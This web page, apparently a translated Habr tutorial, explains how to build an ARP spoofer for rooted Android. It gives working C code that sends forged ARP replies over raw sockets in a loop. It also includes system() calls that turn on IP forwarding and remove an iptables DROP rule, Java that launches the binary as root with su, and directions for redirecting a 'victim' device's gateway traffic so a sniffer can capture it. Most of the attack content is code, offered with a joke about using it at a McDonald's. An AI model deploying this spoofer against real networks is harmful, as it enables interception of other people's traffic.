<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We write ARP Spoofer for Android. Development of Root tools for Android</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Here is my first article on this wonderful resource, so do not judge too harshly. Constructive criticism, amendments and additions are welcome. 

 Sin...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We write ARP Spoofer for Android. Development of Root tools for Android</h1><div class="post__text post__text-html js-mediator-article">  Here is my first article on this wonderful resource, so do not judge too harshly.  Constructive criticism, amendments and additions are welcome. <br><br>  Since this is my first article here, I suggest starting with dating.  It may seem to someone that my nickname (First Row) sounds too pathetic, so I want to clarify the situation, so to speak.  I often subscribed to the "First row viewer", which means "the viewer in the first row."  But when registering a developer account on Google Play, it turned out that there are too many characters.  I had to leave just ‚ÄúFirst Row‚Äù. <br><br>  Well, we have somewhat deviated from the topic, and many, probably, began to annoy my chatter (and there are still a lot of letters at the bottom).  Therefore, I propose to go directly to our topic. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      First of all, I will say that here we will not understand the IP routing, the work of the ARP protocol and the theory of Spoofing itself (I have seen a couple of excellent articles on Habr√© on this topic).  It is also assumed that you know the C, Java languages ‚Äã‚Äãand have at least minimal development skills for Android.  We proceed immediately to the practice, in our case, to the implementation.  First, let's deal with the tools.  Personally, I use Eclipse with the ADT plug-in and the Android NDK installed (in our case, most of the code will be written just in the network).  Perhaps you will edit the sorts in a notebook and collect pens through the terminal, or use Android Studio, or something else.  In this case, it may turn out that some of my recommendations can be omitted.  In this article, I want to tell including some of the pitfalls and rakes, which came when he took up his first project for Android. <br><a name="habracut"></a><br>  So, it occurred to us to write a simple ARP Spoofer for Android.  What do we need?  To begin with, remember that our shell program will be written in Java (we will not touch NativeActivity).  But Java will not give us the necessary functionality to implement our plans.  ‚ÄúJNI‚Äù could have occurred to many.  Not.  This is also not suitable.  In order for our native program to have Root privileges, you will have to start a separate process, and run our program from under the root.  If it is quite obvious for users of * nix-like systems, then for the rest I would like to immediately highlight this point so that no further questions arise.  Well, with this we decided.  Let's write a native program (not a library) that will be run from Java code, under Root.  We need superuser privileges to work with Raw sockets, and also to add the necessary rules to iptables, but more on that later. <br><br>  I propose to start with the most native program.  You can create a new project for now and nothing else.  Do not rush to support JNI in the project (we will do this after considering several pitfalls).  In the meantime, I propose to create our source code, call it arpspoof.c.  We will also turn to Android.mk a bit later. <br><br>  First, let's deal with the program itself.  Here I will not give an example of a full-fledged ARP spoofer, which itself knows the necessary MAC addresses.  You can finish it to a more decent look by yourself, if necessary.  My own task is to give a small example that can help someone save a lot of time (perhaps I didn‚Äôt look bad, but when I started, I wouldn‚Äôt be disturbed by such an example. This is not about the spoofer itself, but about How to properly file this case under android).  So, at the entrance we will take: <br><br>  1) the IP address of the victim; <br>  2) MAC address of the victim; <br>  3) IP address of the gateway (or by whom you want to ‚Äúdisguise‚Äù); <br>  4) Our MAC address (well, or the one to whom you want to "transfer" the traffic of the victim). <br><br>  We will accept them in the form of keys.  Further in a loop with a certain interval (for example, 1 s) we will send an ARP response with the specified addresses.  Before proceeding, let's deal with the format of the ARP header (let's look at if_arp.h for this and consider the fields of the desired structure): <br><br><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">arphdr</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ar_hrd; <span class="hljs-comment"><span class="hljs-comment">/* Format of hardware address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ar_pro; <span class="hljs-comment"><span class="hljs-comment">/* Format of protocol address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> ar_hln; <span class="hljs-comment"><span class="hljs-comment">/* Length of hardware address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> ar_pln; <span class="hljs-comment"><span class="hljs-comment">/* Length of protocol address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ar_op; <span class="hljs-comment"><span class="hljs-comment">/* ARP opcode (command). */</span></span> <span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> 0 </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Ethernet looks like this : This bit is variable sized however... */</span></span></span><span class="hljs-meta"> unsigned char __ar_sha[ETH_ALEN]; </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Sender hardware address. */</span></span></span><span class="hljs-meta"> unsigned char __ar_sip[4]; </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Sender IP address. */</span></span></span><span class="hljs-meta"> unsigned char __ar_tha[ETH_ALEN]; </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Target hardware address. */</span></span></span><span class="hljs-meta"> unsigned char __ar_tip[4]; </span><span class="hljs-comment"><span class="hljs-meta"><span class="hljs-comment">/* Target IP address. */</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">endif</span></span></span><span class="hljs-meta"> };</span></span></code> </pre> <br>  In principle, everything is clear.  Let me explain just some meanings: <br><br>  ar_hrd ‚Äî ARPHDR_ETHER for Ethernet; <br>  ar_pro - in our case ETH_P_IP; <br>  arp_op - we will send ARP responses, therefore ARPOP_REPLY. <br><br>  With the rest of the questions, I think, no one should arise, the size of the ip and mac addresses in bytes, and of the addresses themselves. <br><br>  Well, with the heading ARP sorted out.  In our package, it will follow the Ethernet header.  Let's take it out too.  Look in if_ether.h: <br><br><pre> <code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ethhdr</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> h_dest[ETH_ALEN]; <span class="hljs-comment"><span class="hljs-comment">/* destination eth addr */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> h_source[ETH_ALEN]; <span class="hljs-comment"><span class="hljs-comment">/* source ether addr */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> h_proto; <span class="hljs-comment"><span class="hljs-comment">/* packet type ID field */</span></span> } __attribute__((packed));</code> </pre><br>  Here questions can arise only with the h_proto field (protocol).  In our case, it will be ETH_P_ARP.  For convenience, I combined these two structures into one and replaced the type for IP addresses with char [] with unsigned long, in order to push the address into the required field with the usual assignment.  Such will be the entire package structure: <br><br><pre> <code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">my_arp_packet</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> h_dest[ETH_ALEN]; <span class="hljs-comment"><span class="hljs-comment">/* destination eth addr */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> h_source[ETH_ALEN]; <span class="hljs-comment"><span class="hljs-comment">/* source ether addr */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> h_proto; <span class="hljs-comment"><span class="hljs-comment">/* packet type ID field */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ar_hrd; <span class="hljs-comment"><span class="hljs-comment">/* Format of hardware address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ar_pro; <span class="hljs-comment"><span class="hljs-comment">/* Format of protocol address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> ar_hln; <span class="hljs-comment"><span class="hljs-comment">/* Length of hardware address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> ar_pln; <span class="hljs-comment"><span class="hljs-comment">/* Length of protocol address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ar_op; <span class="hljs-comment"><span class="hljs-comment">/* ARP opcode (command). */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> ar_sha[ETH_ALEN]; <span class="hljs-comment"><span class="hljs-comment">/* Sender hardware address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> ar_sip; <span class="hljs-comment"><span class="hljs-comment">/* Sender IP address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> ar_tha[ETH_ALEN]; <span class="hljs-comment"><span class="hljs-comment">/* Target hardware address. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> ar_tip; <span class="hljs-comment"><span class="hljs-comment">/* Target IP address. */</span></span> } __attribute__((packed));</code> </pre><br>  And finally, our function for sending ARP responses: <br><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arp_reply_send</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *iface_name, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> src_ip, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *src_mac, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> dest_ip, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *dest_mac)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">my_arp_packet</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">arp</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-comment"><span class="hljs-comment">//  Ethernet  memcpy(arp.h_dest,dest_mac,ETH_ALEN); memcpy(arp.h_source,src_mac,ETH_ALEN); arp.h_proto=htons(ETH_P_ARP); //  ARP  arp.ar_hln = ETH_ALEN; arp.ar_pln = 4; arp.ar_hrd = htons(ARPHRD_ETHER); arp.ar_pro = htons(ETH_P_IP); arp.ar_op = htons(ARPOP_REPLY); memcpy(arp.ar_sha,src_mac,ETH_ALEN); memcpy(arp.ar_tha,dest_mac,ETH_ALEN); arp.ar_sip=src_ip; arp.ar_tip=dest_ip; //  ,      int sock = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ARP)); struct sockaddr adr; strcpy(adr.sa_data, iface_name); adr.sa_family = AF_INET; sendto(sock, (void*)&amp;arp, sizeof(struct my_arp_packet), 0, (struct sockaddr *)&amp;adr, sizeof(struct sockaddr)); close(sock); }</span></span></code> </pre><br>  Now we will write the main function.  It's all quite trivial.  The only thing I want to draw your attention to calls to system (), where we add the forward accept rule to iptables, allow routing (one in ip_forward).  Also, when I transferred my project under 5.x, I found the DROP rules in iptables in the natctrl_FORWARD table.  This we also take into account (by the way, this rule, as far as I know, is also found on Android 4.4. I have not seen this in earlier versions). <br><br>  So our code is: <br><br><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">int</span></span> main(<span class="hljs-type"><span class="hljs-type">int</span></span> argc, <span class="hljs-type"><span class="hljs-type">char</span></span> **argv) { //  IP  MAC    unsigned long dest_ip=inet_addr(argv[<span class="hljs-number"><span class="hljs-number">1</span></span>]); unsigned long src_ip=inet_addr(argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]); unsigned <span class="hljs-type"><span class="hljs-type">char</span></span> dest_mac[ETH_ALEN]; unsigned <span class="hljs-type"><span class="hljs-type">char</span></span> src_mac[ETH_ALEN]; str_to_mac(dest_mac, argv[<span class="hljs-number"><span class="hljs-number">2</span></span>]); str_to_mac(src_mac, argv[<span class="hljs-number"><span class="hljs-number">4</span></span>]); //      iptables <span class="hljs-keyword"><span class="hljs-keyword">system</span></span>("echo 1 &gt; /proc/sys/net/ipv4/ip_forward"); <span class="hljs-keyword"><span class="hljs-keyword">system</span></span>("iptables -A FORWARD -j ACCEPT"); //   ,     <span class="hljs-number"><span class="hljs-number">4.4</span></span>   <span class="hljs-keyword"><span class="hljs-keyword">system</span></span>("iptables -D natctrl_FORWARD -j DROP"); <span class="hljs-keyword"><span class="hljs-keyword">system</span></span>("iptables -A natctrl_FORWARD -j ACCEPT"); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>) { arp_reply_send(my_interface, src_ip, src_mac, dest_ip, dest_mac); sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>); } }</code> </pre><br>  Also, you may have noticed that as the first parameter of the function to send a response, we send the interface name.  You can declare / define the string ‚Äúwlan0‚Äù, you can accept the interface name as a key.  Since the program is for phones and tablets, you can get by in advance with a line.  I will not give support functions like str_to_mac here, you can familiarize yourself with them by downloading the archive with the source code, or implement it yourself. <br><br>  Let's get down to writing our Java shell.  I think it will not be difficult for anyone present to throw in the xml-file with the same LinearLayout, four EditText'ami and a pair of Button'ov to start and stop.  Then create a class, for example, MainActivity, inheriting from the Activity, hang handlers on our buttons (you can download the full source code, link under the cat).  Here I will give only the main function that will run our native prog.  And before you give her description, it's time to think exactly how (from where we will run it). <br><br>  The fact is that in order for us to run our program, the executable file must be located in the application folder.  That is, for a start, it should get into our package during assembly.  Then it should not be thrown out by the APK unpacker when installed on the end device.  These are two main points, due to which at the beginning there can be difficulties if the project contains not an executable, but an executable file.  Do not forget that by collecting our binary not as a library, but as an executable file, we will get a file with an output that does not correspond to what the library should be called.  This means that such a file simply simply does not fall into our package during assembly (in this case, this is the project's lib folder).  If you simply add the .so extension, specifying the module name, it will be included in the APK file, but it will be thrown away by the installer on the end device.  And we are not allowed to add the lib prefix to the module name.  Such is the problem, the sensible description / solution of which I did not find anywhere.  Although maybe just looking bad.  But perhaps this is also related to the ‚Äúspecial features‚Äù of such programs, because we are given the JNI interface, and to build a program with a library of unnecessary actions, we are not really required.  But what if the project should include executable files?  So, we have 2 options, each with its own pros and cons: <br><br>  1) Do not add JNI support to the project, but create the necessary folders (armeabi, x86 if necessary) in the project libs folder with pens.  Compile the code in a different project, and then (! Important) copy each binary into / libs / armeabi or x86 in the following form: libNAME_Program.so.so.  A good option, he used it at first.  But I still wanted to build all at once with one button from the development environment.  Moreover, the main work in my case was just native, and it was very inconvenient to transfer a bunch of my utility binaries and rename them at the same time (or one at a time, depending on how many changes were made and where).  The advantage of the method is that if you used, say, ready-made samples, and you will not need to change them in the process (if the work is only on the Java part), then this method will actually be less expensive. <br><br>  2) Add jni support to the project, everything is as usual, but after describing the assembly of each file, add the following code: <br>  $ (shell mv $ {NDK_APP_DST_DIR} / BINARY NAME $ {NDK_APP_DST_DIR} /libBINARY NAME.so) <br>  and at the very beginning of our Android.mk ask <br>  SHELL: = / bin / sh <br>  Those.  right after the build, every binary will be renamed to the format we need.  The disadvantage of this method is one - with each build of the project, the binaries are renamed to the original form by the build program itself.  In order for our script to work, the last modified file must be Android.mk.  That is, before each build of the project you will have to open it, put, for example, a space, then assemble it.  The same applies to export to the APK file for the market.  We rule Android.mk, save, export.  In this case, everything will be fine.  Still, when using this method, I recommend monitoring the size of the final APK file, if our files didn‚Äôt get there for some reason, its size will be smaller (how much depends on the number of assemblies, whether you use static linking, etc.) but resizing will be anyway). <br><br>  You can, of course, still upload the necessary files from the server when you start the program or come up with something else in this spirit, but, in my opinion, such approaches have no place in this article.  It is also possible to collect pens from the console, with manual assembly of the output file name, we can specify any.  But in this case, I repeat, we are talking about work using the development environment.  Personally, I stopped at the second method.  I use it in the example, the source code of which you can download immediately after the article.  You can choose either of the two methods described above, or, if you know some other way, write about it in the comments.  Before we finish with the native part, I will give you my Android.mk: <br><br><pre> <code class="bash hljs">SHELL:=/bin/sh LOCAL_PATH:= $(call my-dir) include $(CLEAR_VARS) LOCAL_CFLAGS := -std=c99 LOCAL_SRC_FILES := arpspoof.c LOCAL_MODULE := arpspoof include $(BUILD_EXECUTABLE) $(shell mv <span class="hljs-variable"><span class="hljs-variable">${NDK_APP_DST_DIR}</span></span>/arpspoof <span class="hljs-variable"><span class="hljs-variable">${NDK_APP_DST_DIR}</span></span>/libarpspoof.so)</code> </pre><br>  I also want to note that for Android 4.0 and below it is also worth using static linking (-static switch for LOCAL_LDFLAGS), for 4.1 it is better to use dynamic build. <br><br>  Well, we figured out the build.  The method of "storing" our executable file in the package chosen.  Rather, the method of hitting that same file in the folder we need.  Now I‚Äôll give you the promised function that the handler of our spoof button calls: <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">start_native_app</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Thread(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Runnable() { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ Process suProcess=<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { suProcess = Runtime.getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"su"</span></span>); DataOutputStream os = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DataOutputStream(suProcess.getOutputStream()); String command=getApplicationContext().getFilesDir().getParent() + <span class="hljs-string"><span class="hljs-string">"/lib/libarpspoof.so"</span></span>; command+= ¬´ ¬ª + edit1.getText().toString() + ¬´ ¬ª + edit2.getText().toString() + ¬´ ¬ª + edit3.getText().toString() + ¬´ ¬ª + edit4.getText().toString(); os.writeBytes(command + <span class="hljs-string"><span class="hljs-string">"\n"</span></span>); os.close(); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (IOException e) { <span class="hljs-comment"><span class="hljs-comment">// TODO Auto-generated catch block e.printStackTrace(); } } }).start(); }</span></span></code> </pre><br>  Everything is simple here, we start Thread, in which we launch a new process with a command interpreter as root (su) and write our command through the output stream.  The command itself will be the full path to our executable file + keys.  The full path to the file will be / data / data / PACKET_NAME / lib / NAME_FILE. <br><br>  So, there is only one question left - how to complete our spoofer?  The easiest option is to call from under the root <br>  killall -SIGKILL libarpspoof.so <br>  when you click on another button, designed to complete.  You can also catch, say, SIGINT in the program itself and make an exit from the loop in the main.  If you are writing a more complex program that interacts with the shell, you can send the pid of the process at startup, then call your own implementation of kill, and pass the received pid as a key.  I used this method in Network Utilities in order to make the program less dependent on busybox (not everyone has the killall applet), and the incomplete native program, to put it mildly, is not buzzing.  But for our educational implementation and this method will fit.  But if you are writing an application that will be used not only by you, I recommend using your own program-terminator (or at least check for the presence of the necessary busybox applet).  In general, for this program you can use any version you like.  I think that you can cope with writing the handler of the second and final button without me.  If suddenly that - we look in sorts, under article.  Also, in order to ‚Äúdecorate‚Äù the program a little, you can inactivate the start button when you click on it, and again make it active when you press the stop.  Or, say, use ToggleButton.  This is up to you.  My task is to provide the simplest example possible.  There is nothing special about littering here, so let's go further.  It remains to add the necessary permishny in AndroidManifest.  And it will be: <br><br>  &lt;uses-permission android: name = "android.permission.ACCESS_SUPERUSER" /&gt; <br>  &lt;uses-permission android: name = "android.permission.INTERNET" /&gt; <br><br>  Before turning to the final part of the article, I would like to give you a couple of tips for the future: <br>  1) If your program needs to be completed manually, (as in this example), it is better to make sure that the native program is necessarily terminated on exit.  For example, in the handler of the exit button from the application. <br>  2) Third-party installation programs for packages (for example, included in some file managers) during installation may not specify execution attributes for executable files included in your program.  Itself in due time came on this rake.  Best at startup, check the attributes and set manually if necessary. <br><br>  I know you, as I can not wait to try out our ARP Spoofer.  It's time to do it.  We put together a project (remember what I said about editing Android.mk), drop the received APK on your favorite rooted phone, drive in IP and MAC addresses, click on the cherished button.  On the victim computer, open the terminal and check the ARP nameplate (arp -a).  The MAC address of the gateway (or what you specified as the IP address of the sender) should be changed to the MAC address that you specified as the sender's mac.  Important - it must be an address existing in this network (device address, for example).  But I think you know it perfectly well without me.  In this case, by running any sniffer (for example, a member of Network Utilities), you will see packets going from the ‚Äúvictim‚Äù to the gateway).  Therefore, the task is completed.  ARP Spoofer is written and works great.  It remains only to write a simple sniffer and you can go to the nearest McDonald (a joke, of course). <br><br>  To see an example of a full-fledged similar program with a bunch of "tricks" and features, you can download Network Utilities from the link below.  And yes, in the description on the market, many opportunities and ‚Äúfeatures‚Äù had to be dropped, leaving only ping, traceroute and similar harmless trivia.  For example, you can take as a basis the Arp spoofer that goes in there and try to ‚Äúfinish‚Äù our modest example to this level, making it ‚Äúmassive‚Äù, add the ‚Äúrecognition‚Äù algorithms for the addresses we need.  But this is so, the groundwork for the future, suddenly someone will be interested.  On this, perhaps, it is time to say goodbye.  If the article is to the liking of the community, perhaps in the future I will write more.  For example, about creating a sniffer, or a network scanner for android. <br><br>  And finally, here are links: <br><br>  Link to the archive with spoofer samples: <a href="http://rghost.ru/87t2Y58Nn">rghost.ru/87t2Y58Nn</a> <br>  Promised link to Network Utilities (not advertising): <a href="https://play.google.com/store/apps/details%3Fid%3Dcom.myprog.netutils">play.google.com/store/apps/details?id=com.myprog.netutils</a> <br><br>  Thanks for attention. </div><p>Source: <a href="https://habr.com/ru/post/253321/">https://habr.com/ru/post/253321/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../253311/index.html">‚ÄúHackers and artists‚Äù, ‚ÄúOn Lisp‚Äù and essay in Russian. Learning to write like Paul Graham</a></li>
<li><a href="../253313/index.html">Optimum continuous archive sorting</a></li>
<li><a href="../253315/index.html">Juniper tincture: Prepare Juniper SRX. Part 3: Virtual Routers</a></li>
<li><a href="../253317/index.html">RabbitMQ tutorials in C ++</a></li>
<li><a href="../253319/index.html">Introduction to what3words API: Basic Procedures and Samples</a></li>
<li><a href="../253323/index.html">Creating a custom matcher for unit testing in Jasmine 2.0</a></li>
<li><a href="../253327/index.html">Google will increase the security of its Android app store</a></li>
<li><a href="../253329/index.html">JetBrains at RubyConfBy in Minsk on March 22</a></li>
<li><a href="../253331/index.html">OpenWRT + OpenVPN for Asterisk. Budget way to organize a VPN network</a></li>
<li><a href="../253333/index.html">Corporate Laboratories PENTESTIT - practical training in the field of information security</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>